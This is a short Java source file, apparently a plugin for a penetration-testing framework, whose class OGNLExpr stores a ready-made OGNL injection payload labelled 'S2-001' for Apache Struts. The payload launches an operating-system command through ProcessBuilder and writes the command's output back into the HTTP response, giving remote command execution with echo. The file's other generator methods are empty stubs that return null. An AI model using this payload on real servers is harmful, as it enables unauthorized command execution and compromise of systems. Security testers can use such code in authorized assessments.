package me.gv7.woodpecker.plugin.exprs;

import me.gv7.woodpecker.plugin.IExpr;

import java.util.Hashtable;

public class OGNLExpr implements IExpr {
    @Override
    public String getName() {
        return "OGNL";
    }

    Hashtable<String, String> exps = new Hashtable<String, String>() {{
        put("S2-001", "%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{\"%s\"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}");
    }};

    @Override
    public String[] genDnslog(String domain) {
        return null;
    }

    @Override
    public String[] genHttplog(String url) {
        return null;
    }

    @Override
    public String[] genSleep(int sec) {
        return null;
    }

    @Override
    public String[] genExec(String command) {
        return null;
    }

    @Override
    public String[] genExecWithEcho(String command) {
        return null;
    }
}
